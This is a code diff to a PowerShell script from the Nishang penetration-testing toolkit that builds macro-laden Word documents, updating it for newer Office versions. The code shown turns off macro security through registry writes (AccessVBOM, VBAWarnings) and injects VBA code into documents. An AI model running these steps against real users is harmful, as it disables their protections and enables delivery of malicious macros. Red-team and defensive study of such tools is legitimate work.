@@ -124,11 +124,20 @@ https://github.com/samratashok/nishang
     )
     
     $Word = New-Object -ComObject Word.Application
-    $Word.DisplayAlerts = $False
     $WordVersion = $Word.Version
+
+    #Check for Office 2007 or Office 2003
+    if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
+    {
+        $Word.DisplayAlerts = $False
+    }
+    else
+    {
+        $Word.DisplayAlerts = "wdAlertsNone"
+    }    
     #Turn off Macro Security
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -Force | Out-Null
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | Out-Null
 
     if(!$Payload)
     {
@@ -181,7 +190,14 @@ https://github.com/samratashok/nishang
             {
                 $Savepath = $WordFile.FullName + ".doc"
             }
-            $Doc.Saveas($SavePath, 0)
+            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
+            {
+                $Doc.Saveas($SavePath, 0)
+            }
+            else
+            {
+                $Doc.Saveas([ref]$SavePath, 0)
+            } 
             Write-Output "Saved to file $SavePath"
             $Doc.Close()
             $LastModifyTime = $WordFile.LastWriteTime
@@ -201,7 +217,14 @@ https://github.com/samratashok/nishang
         $Doc = $Word.documents.add()
         $DocModule = $Doc.VBProject.VBComponents.Item(1)
         $DocModule.CodeModule.AddFromString($code)
-        $Doc.Saveas($OutputFile, 0)
+        if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
+        {
+            $Doc.Saveas($OutputFile, 0)
+        }
+        else
+        {
+            $Doc.Saveas([ref]$OutputFile, [ref]0)
+        } 
         Write-Output "Saved to file $OutputFile"
         $Doc.Close()
         $Word.quit()
